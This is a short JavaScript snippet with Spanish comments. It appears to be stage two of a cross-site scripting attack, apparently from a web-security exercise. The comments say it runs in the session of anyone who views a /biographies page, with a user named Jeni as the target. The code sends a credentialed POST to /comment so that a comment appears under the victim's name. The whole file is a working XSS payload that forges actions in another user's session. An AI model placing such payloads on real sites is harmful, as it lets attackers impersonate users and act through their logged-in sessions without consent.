// ETAPA 2 — corre en la sesión de quien mira /biographies (objetivo: Jeni).
// Publica un comentario como ese usuario -> comentario firmado por Jeni.
(function () {
  var b = new URLSearchParams();
  b.append("content", "jeni estuvo aca");
  fetch("/comment", {
    method: "POST",
    credentials: "include",
    headers: { "Content-Type": "application/x-www-form-urlencoded" },
    body: b
  });
})();
